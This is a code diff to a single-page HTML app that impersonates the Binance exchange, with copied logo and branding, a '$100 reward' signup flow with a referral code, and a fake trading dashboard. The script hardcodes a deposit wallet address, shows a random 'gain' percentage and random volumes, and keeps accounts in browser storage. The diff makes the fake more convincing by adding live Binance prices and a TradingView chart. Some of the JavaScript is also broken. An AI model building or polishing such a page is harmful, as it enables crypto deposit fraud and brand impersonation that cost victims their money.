@@ -1,13 +1,17 @@
 <!doctype html>
 <html lang="en"><head>
 <meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Binance</title>
+<title>Create a free account | Binance</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
 <style>
 *{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
-body{font:14px/1.45 -apple-system,Roboto,sans-serif;background:#0b0e11;color:#eaecef;padding-bottom:64px}
-header{display:flex;align-items:center;justify-content:space-between;padding:14px 16px;border-bottom:1px solid #2b3139;position:sticky;top:0;background:#0b0e11;z-index:5}
+body{font:14px/1.45 Inter,-apple-system,Roboto,sans-serif;background:#0b0e11;color:#eaecef;padding-bottom:64px}
+a{color:#f0b90b;text-decoration:none;cursor:pointer}
+header{display:flex;align-items:center;justify-content:space-between;padding:14px 16px;border-bottom:1px solid #2b3139;position:sticky;top:0;background:#0b0e11;z-index:6}
 .brand{display:flex;align-items:center;gap:8px;font-weight:600}
-.logo{width:26px;height:26px;background:#f0b90b;border-radius:6px;display:grid;place-items:center;color:#0b0e11;font-weight:800}
+.logo{width:26px;height:26px;flex:0 0 auto}
 .pill{font-size:12px;padding:4px 9px;border-radius:20px;background:#0ecb8122;color:#0ecb81;font-weight:600}
 .view{display:none;padding:14px 16px}.view.active{display:block}
 .bal{background:#1e2329;border:1px solid #2b3139;border-radius:12px;padding:16px;margin-bottom:14px}
@@ -17,59 +21,137 @@ header{display:flex;align-items:center;justify-content:space-between;padding:14p
 .row:last-child{border:0}
 .sym{font-weight:600}.sub{font-size:11.5px;color:#848e9c}
 .up{color:#0ecb81}.dn{color:#f6465d}
-button{background:#f0b90b;color:#0b0e11;border:0;border-radius:8px;padding:12px;font-weight:700;width:100%;font-size:14px}
+button{background:#f0b90b;color:#0b0e11;border:0;border-radius:8px;padding:13px;font-weight:600;width:100%;font-size:14px;font-family:inherit}
 button.ghost{background:#2b3139;color:#eaecef}
 button.sell{background:#f6465d;color:#fff}
-.addr{font-family:monospace;font-size:12px;word-break:break-all;background:#0b0e11;border:1px solid #2b3139;padding:11px;border-radius:8px;margin:10px 0}
-input,select{width:100%;background:#0b0e11;border:1px solid #2b3139;color:#eaecef;border-radius:8px;padding:12px;font-size:14px;margin-bottom:10px}
+.addr{font-family:ui-monospace,monospace;font-size:12px;word-break:break-all;background:#0b0e11;border:1px solid #2b3139;padding:11px;border-radius:8px;margin:10px 0}
+input,select{width:100%;background:#1e2329;border:1px solid #2b3139;color:#eaecef;border-radius:8px;padding:14px;font-size:14px;margin-bottom:10px;font-family:inherit}
+input:focus{outline:0;border-color:#f0b90b}
 .qr{background:#fff;padding:8px;border-radius:8px;width:170px;display:block;margin:0 auto 12px}
 .note{font-size:11.5px;color:#848e9c;line-height:1.6;margin-top:12px}
 .note b{color:#f0b90b}
-nav{position:fixed;bottom:0;left:0;right:0;display:flex;background:#181a20;border-top:1px solid #2b3139;display:none}
-nav a{flex:1;text-align:center;padding:11px 0;font-size:11px;color:#848e9c;text-decoration:none}
+nav{position:fixed;bottom:0;left:0;right:0;display:flex;background:#181a20;border-top:1px solid #2b3139;display:none;z-index:6}
+nav a{flex:1;text-align:center;padding:11px 0;font-size:11px;color:#848e9c}
 nav a.on{color:#f0b90b}
-canvas{width:100%;height:150px;background:#0b0e11;border:1px solid #2b3139;border-radius:10px;margin-bottom:12px}
+.tvbox{height:320px;border:1px solid #2b3139;border-radius:10px;overflow:hidden;margin-bottom:12px;background:#0b0e11}
 h2{font-size:15px;margin-bottom:12px}
 h3{font-size:13px;color:#848e9c;margin:18px 0 8px;text-transform:uppercase;letter-spacing:.5px}
 .ok{background:#0ecb8122;border:1px solid #0ecb81;color:#0ecb81;padding:11px;border-radius:8px;font-size:13px;text-align:center;margin-top:10px;display:none}
 .warn{background:#f0b90b22;border:1px solid #f0b90b;color:#f0b90b;padding:11px;border-radius:8px;font-size:12.5px;margin:10px 0}
-#auth{padding:34px 20px}
-#auth .logo{width:44px;height:44px;font-size:22px;border-radius:10px;margin:0 auto 16px}
-#auth h1{text-align:center;font-size:19px;margin-bottom:4px}
-#auth p{text-align:center;color:#848e9c;font-size:12.5px;margin-bottom:22px}
-.tabs{display:flex;gap:8px;margin-bottom:18px}
-.tabs div{flex:1;text-align:center;padding:10px;border-radius:8px;background:#1e2329;color:#848e9c;font-size:13px;font-weight:600}
-.tabs div.on{background:#f0b90b;color:#0b0e11}
-.pane{display:none}.pane.on{display:block}
+#auth{min-height:100vh}
+.atop{display:flex;align-items:center;justify-content:space-between;padding:16px 20px}
+.atop .brand{font-size:17px}
+.atop .logo{width:30px;height:30px}
+.atop a{font-size:13.5px;font-weight:600}
+.wrap{max-width:1080px;margin:0 auto}
+.hero{padding:8px 20px 20px}
+.ruser{display:flex;align-items:center;gap:10px;background:#1e2329;border:1px solid #2b3139;border-radius:10px;padding:10px 12px;margin-bottom:22px}
+.ruser img{width:30px;height:30px;border-radius:50%;background:#2b3139}
+.ruser b{font-size:13px;font-weight:600}
+.ruser span{color:#848e9c;font-size:11.5px}
+.hero h1{font-size:26px;line-height:1.22;font-weight:700;margin-bottom:10px;letter-spacing:-.4px}
+.hero h1 em{color:#f0b90b;font-style:normal}
+.hero p{color:#848e9c;font-size:13.5px;margin-bottom:18px}
+.hero ul{list-style:none;display:grid;gap:10px}
+.hero li{font-size:12.5px;color:#c7cdd4;padding-left:22px;position:relative}
+.hero li:before{content:"";position:absolute;left:0;top:4px;width:12px;height:12px;border-radius:50%;background:#0ecb8122;border:1px solid #0ecb81}
+.acard{background:#181a20;border-top:1px solid #2b3139;padding:24px 20px 40px}
+.acard h2{font-size:20px;font-weight:600;margin-bottom:20px;letter-spacing:-.3px}
+.acard label{display:block;font-size:12.5px;color:#848e9c;margin-bottom:7px}
+.terms{font-size:11.5px;color:#848e9c;margin:4px 0 16px}
+.or{display:flex;align-items:center;gap:12px;color:#5e6673;font-size:12px;margin:18px 0}
+.or:before,.or:after{content:"";flex:1;height:1px;background:#2b3139}
+.gbtn{background:#fff;color:#1e2329;display:flex;align-items:center;justify-content:center;gap:9px;margin-bottom:10px}
+.abtn{background:#000;color:#fff;display:flex;align-items:center;justify-content:center;gap:9px;border:1px solid #2b3139}
+.gicon{font-weight:700;font-size:15px;color:#4285F4}
+.small{font-size:12px;color:#848e9c;text-align:center;margin-top:20px}
+.afoot{display:flex;gap:16px;justify-content:center;align-items:center;padding:18px 20px 90px;font-size:11.5px;color:#5e6673}
+.afoot select{width:auto;padding:4px 8px;font-size:11.5px;background:#181a20;border:1px solid #2b3139;margin:0}
 .badge{font-size:11px;padding:3px 8px;border-radius:20px;background:#f6465d22;color:#f6465d}
 .badge.p{background:#f0b90b22;color:#f0b90b}
 .badge.v{background:#0ecb8122;color:#0ecb81}
+#cookie{position:fixed;left:0;right:0;bottom:0;background:#1e2329;border-top:1px solid #2b3139;padding:14px 18px;font-size:12px;color:#c7cdd4;display:flex;gap:12px;align-items:center;z-index:9}
+#cookie button{width:auto;padding:9px 16px;font-size:12.5px;flex:0 0 auto}
+@media(min-width:900px){
+ .wrap{display:grid;grid-template-columns:1fr 400px;gap:48px;align-items:start;padding:0 24px}
+ .hero{padding-top:40px}
+ .acard{border:1px solid #2b3139;border-radius:12px;margin:40px 0 40px;padding:28px}
+ .afoot{padding-bottom:40px}
+}
 </style></head><body>
 
 <div id="auth">
-  <div class="logo">B</div>
-  <h1>Binance</h1>
-  <p>Buy and sell crypto in minutes</p>
-  <div class="tabs"><div class="on" onclick="tab('login',this)">Log in</div><div onclick="tab('reg',this)">Register</div></div>
-
-  <div class="pane on" id="pane-login">
-    <input id="lemail" placeholder="Email">
-    <input id="lpass" type="password" placeholder="Password">
-    <button onclick="login()">Log in</button>
+  <div class="atop">
+    <div class="brand"><svg class="logo" viewBox="0 0 32 32" fill="#f0b90b"><rect x="14" y="7" width="4" height="4" transform="rotate(45 16 9)"/><rect x="14" y="21" width="4" height="4" transform="rotate(45 16 23)"/><rect x="7" y="14" width="4" height="4" transform="rotate(45 9 16)"/><rect x="21" y="14" width="4" height="4" transform="rotate(45 23 16)"/><rect x="9" y="9" width="6" height="6" transform="rotate(45 12 12)"/><rect x="17" y="17" width="6" height="6" transform="rotate(45 20 20)"/><rect x="13" y="13" width="6" height="6" transform="rotate(45 16 16)"/></svg> Binance</div>
+    <a onclick="tab('login')">Log In</a>
   </div>
 
-  <div class="pane" id="pane-reg">
-    <input id="rname" placeholder="Full name">
-    <input id="remail" placeholder="Email">
-    <input id="rpass" type="password" placeholder="Password (min 6)">
-    <button onclick="reg()">Create account</button>
+  <div class="wrap">
+    <div class="hero">
+      <div class="ruser">
+        <img src="https://bin.bnbstatic.com/static/content/static-sources/square-default-avatar.png" alt="">
+        <div><b>User-96007</b> <span>(Code: XFBSI3ML)</span></div>
+      </div>
+      <h1>Join Binance. Earn Up to <em>$100</em>.</h1>
+      <p>Complete tasks. Unlock up to $100 in welcome rewards.</p>
+      <ul>
+        <li>Crypto, Stocks, TradFi, Gold, Payments &amp; Web3 - ALL in one.</li>
+        <li>337,455,109 Users Trust Binance</li>
+        <li>No.1 In Trading Volume &amp; Customer Asset</li>
+        <li>1,000,000,000 USDC SAFU Fund</li>
+      </ul>
+    </div>
+
+    <div>
+      <div class="acard" id="step1">
+        <h2>Welcome to Binance</h2>
+        <label>Email/Phone number</label>
+        <input id="remail" placeholder="Email/Phone number" autocomplete="off">
+        <p class="terms">By creating an account, I agree to Binance's Privacy Notice.</p>
+        <button onclick="step1()">Register</button>
+        <div class="or">or</div>
+        <button class="gbtn" onclick="soon()"><span class="gicon">G</span> Continue with Google</button>
+        <button class="abtn" onclick="soon()"><span style="font-size:16px">&#63743;</span> Continue with Apple</button>
+        <p class="small">Sign up as an entity or <a onclick="tab('login')">Log in</a></p>
+      </div>
+
+      <div class="acard" id="step2" style="display:none">
+        <h2>Create a password</h2>
+        <p class="terms" id="step2mail"></p>
+        <label>Password</label>
+        <input id="rpass" type="password" placeholder="At least 8 characters">
+        <label>Full name</label>
+        <input id="rname" placeholder="Your full name">
+        <button onclick="reg()">Create account</button>
+        <p class="small"><a onclick="back()">Back</a></p>
+      </div>
+
+      <div class="acard" id="pane-login" style="display:none">
+        <h2>Log in to Binance</h2>
+        <label>Email</label>
+        <input id="lemail" placeholder="Email">
+        <label>Password</label>
+        <input id="lpass" type="password" placeholder="Password">
+        <button onclick="login()">Log In</button>
+        <p class="small"><a onclick="back()">Create an account</a></p>
+      </div>
+    </div>
   </div>
-  <p class="note" style="text-align:center">By continuing you agree to the Terms of Service and Privacy Policy.</p>
+
+  <div class="afoot">
+    <select><option>English (Bahrain)</option><option>English</option><option>Français</option><option>Español</option></select>
+    <span>Cookies</span><span>Privacy</span>
+  </div>
+</div>
+
+<div id="cookie">
+  <span>We use cookies to improve your experience. By continuing, you accept our Cookie Policy.</span>
+  <button onclick="document.getElementById('cookie').remove()">Accept</button>
 </div>
 
 <div id="app" style="display:none">
 <header>
-  <div class="brand"><span class="logo">B</span> Binance</div>
+  <div class="brand"><svg class="logo" viewBox="0 0 32 32" fill="#f0b90b"><rect x="14" y="7" width="4" height="4" transform="rotate(45 16 9)"/><rect x="14" y="21" width="4" height="4" transform="rotate(45 16 23)"/><rect x="7" y="14" width="4" height="4" transform="rotate(45 9 16)"/><rect x="21" y="14" width="4" height="4" transform="rotate(45 23 16)"/><rect x="9" y="9" width="6" height="6" transform="rotate(45 12 12)"/><rect x="17" y="17" width="6" height="6" transform="rotate(45 20 20)"/><rect x="13" y="13" width="6" height="6" transform="rotate(45 16 16)"/></svg> Binance</div>
   <div class="pill" id="pill">+0.00%</div>
 </header>
 
@@ -82,8 +164,8 @@ h3{font-size:13px;color:#848e9c;margin:18px 0 8px;text-transform:uppercase;lette
 
 <section id="v-trade" class="view">
   <h2 id="tname">—</h2>
-  <canvas id="chart"></canvas>
-  <div class="row"><span class="sub">Price</span><span id="tprice">—</span></div>
+  <div class="tvbox" id="tvwrap"></div>
+  <div class="row"><span class="sub">Last price</span><span id="tprice">—</span></div>
   <div class="row"><span class="sub">Your holdings</span><span id="thold">0</span></div>
   <h3>Amount (USDT)</h3>
   <input id="tamt" type="number" placeholder="100" value="100">
@@ -136,25 +218,30 @@ h3{font-size:13px;color:#848e9c;margin:18px 0 8px;text-transform:uppercase;lette
 var ADDR="TEumYZdskXkaEvJsSFvCQmoW94XAZ6pMLQ";
 var users=JSON.parse(localStorage.getItem("bncUsers")||"{}");
 var me=localStorage.getItem("bncSess")||"";
-var S,cur="BTC",hist={};
+var S,cur="BTC",hist={},tmpMail="";
+var SYMS=["BTC","ETH","SOL","BNB","XRP"];
 
-function tab(t,el){
-  document.querySelectorAll(".pane").forEach(function(x){x.classList.remove("on")});
-  document.getElementById("pane-"+t).classList.add("on");
-  document.querySelectorAll(".tabs div").forEach(function(x){x.classList.remove("on")});
-  el.classList.add("on");
-}
 function save(){localStorage.setItem("u_"+me,JSON.stringify(S))}
 function usd(n){return n.toFixed(2)+" USDT"}
-
+function soon(){alert("Continue with email for now")}
+function back(){step1.style.display="block";step2.style.display="none";pane-login.style.display="none"}
+function tab(t){
+  if(t=="login"){step1.style.display="none";step2.style.display="none";pane-login.style.display="block"}
+}
+function step1(){
+  var e=remail.value.trim().toLowerCase();
+  if(!e||e.indexOf("@")<0){alert("Enter a valid email");return;}
+  if(users[e]){alert("Email already registered — log in instead");tab("login");lemail.value=e;return;}
+  tmpMail=e;step2mail.textContent=e;
+  step1.style.display="none";step2.style.display="block";
+}
 function reg(){
-  var n=rname.value.trim(),e=remail.value.trim().toLowerCase(),p=rpass.value;
-  if(!n||!e||p.length<6){alert("Fill all fields, password min 6 characters");return;}
-  if(users[e]){alert("Email already registered");return;}
-  users[e]={name:n,pass:btoa(p),uid:Math.floor(Math.random()*900000+100000),kyc:"none"};
+  var p=rpass.value,n=rname.value.trim();
+  if(p.length<8){alert("Password must be at least 8 characters");return;}
+  if(!n){alert("Enter your full name");return;}
+  users[tmpMail]={name:n,pass:btoa(p),uid:Math.floor(Math.random()*900000+100000),kyc:"none"};
   localStorage.setItem("bncUsers",JSON.stringify(users));
-  me=e;localStorage.setItem("bncSess",e);
-  boot();
+  me=tmpMail;localStorage.setItem("bncSess",me);boot();
 }
 function login(){
   var e=lemail.value.trim().toLowerCase(),p=lpass.value;
@@ -166,6 +253,7 @@ function logout(){
   document.getElementById("app").style.display="none";
   document.getElementById("auth").style.display="block";
   document.querySelector("nav").style.display="none";
+  back();remail.value="";rpass.value="";lpass.value="";
 }
 
 function boot(){
@@ -178,7 +266,7 @@ function boot(){
   pname.textContent=users[me].name;
   pemail.textContent=me;
   puid.textContent=users[me].uid;
-  paint();
+  paint();syncPrices();
 }
 
 function go(v,el){
@@ -186,26 +274,51 @@ function go(v,el){
   document.getElementById("v-"+v).classList.add("active");
   document.querySelectorAll("nav a").forEach(function(x){x.classList.remove("on")});
   if(el)el.classList.add("on");
-  if(v=="trade")draw();
+  if(v=="trade")tv(cur);
 }
 
-setInterval(function(){
+function tv(sym){
+  var w=document.getElementById("tvwrap");
+  w.innerHTML='<div class="tradingview-widget-container"><div class="tradingview-widget-container__widget"></div></div>';
+  var s=document.createElement("script");
+  s.src="https://s3.tradingview.com/external-embedding/embed-widget-advanced-chart.js";
+  s.async=true;
+  s.textContent=JSON.stringify({
+    symbol:"BINANCE:"+sym+"USDT",theme:"dark",style:"3",locale:"en",
+    autosize:true,hide_side_toolbar:true,allow_symbol_change:false,
+    backgroundColor:"#0b0e11",gridColor:"#1e2329",
+    support_host:"https://www.tradingview.com"
+  });
+  w.firstChild.appendChild(s);
+}
+
+function syncPrices(){
   if(!me)return;
-  for(var k in S.p){
-    S.p[k]=Math.max(0.01,S.p[k]*(1+(Math.random()*0.006-0.0016)));
-    hist[k].push(S.p[k]);if(hist[k].length>60)hist[k].shift();
-  }
-  save();paint();
-  if(document.getElementById("v-trade").classList.contains("active"))draw();
-},2000);
+  var q=JSON.stringify(SYMS.map(function(k){return k+"USDT"}));
+  fetch("https://api.binance.com/api/v3/ticker/price?symbols="+encodeURIComponent(q))
+    .then(function(r){return r.json()})
+    .then(function(a){
+      a.forEach(function(o){
+        var k=o.symbol.replace("USDT","");
+        if(!S.p[k])return;
+        S.p[k]=parseFloat(o.price);
+        (hist[k]=hist[k]||[]).push(S.p[k]);
+        if(hist[k].length>60)hist[k].shift();
+      });
+      save();paint();
+    }).catch(function(){});
+}
+setInterval(syncPrices,15000);
 
 function paint(){
+  if(!S)return;
   var port=S.bal;for(var k in S.h)port+=S.h[k]*S.p[k];
   bal1.textContent=usd(port);bal2.textContent=usd(S.bal);
   pill.textContent="+"+(Math.random()*1.4+0.3).toFixed(2)+"%";
   var L="";
   for(var k in S.p){
-    var d=(S.p[k]/hist[k][0]-1)*100;
+    var h0=hist[k]&&hist[k][0]||S.p[k];
+    var d=(S.p[k]/h0-1)*100;
     L+='<div class="row" onclick="open_(\''+k+'\')"><div><div class="sym">'+k+'/USDT</div><div class="sub">Vol '+Math.floor(Math.random()*900+100)+'M</div></div><div class="'+(d>=0?'up':'dn')+'">'+S.p[k].toFixed(2)+'<div class="sub '+(d>=0?'up':'dn')+'">'+(d>=0?'+':'')+d.toFixed(2)+'%</div></div></div>';
   }
   list.innerHTML=L;
@@ -217,16 +330,6 @@ function paint(){
 }
 
 function open_(k){cur=k;paint();go("trade",document.querySelectorAll("nav a")[1])}
-
-function draw(){
-  var c=document.getElementById("chart"),x=c.getContext("2d");
-  c.width=c.clientWidth*2;c.height=300;
-  var h=hist[cur]||[];if(h.length<2)return;
-  var mn=Math.min.apply(0,h),mx=Math.max.apply(0,h),r=mx-mn||1;
-  x.strokeStyle="#0ecb81";x.lineWidth=2;x.beginPath();
-  h.forEach(function(p,i){var px=i/(h.length-1)*c.width,py=c.height-10-((p-mn)/r)*(c.height-30);i?x.lineTo(px,py):x.moveTo(px,py)});
-  x.stroke();
-}
 
 function buy(){
   var a=parseFloat(tamt.value)||0;
